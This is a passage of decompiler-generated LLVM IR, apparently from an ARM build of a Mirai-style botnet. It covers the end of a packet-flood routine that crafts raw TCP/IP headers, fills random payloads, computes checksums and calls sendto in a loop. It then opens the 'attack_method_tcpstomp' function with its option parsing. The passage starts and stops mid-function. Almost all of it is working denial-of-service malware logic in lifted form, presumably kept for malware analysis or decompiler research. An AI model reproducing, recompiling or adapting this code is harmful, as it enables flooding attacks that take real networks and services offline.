  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v5_afec, { 1, 0 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
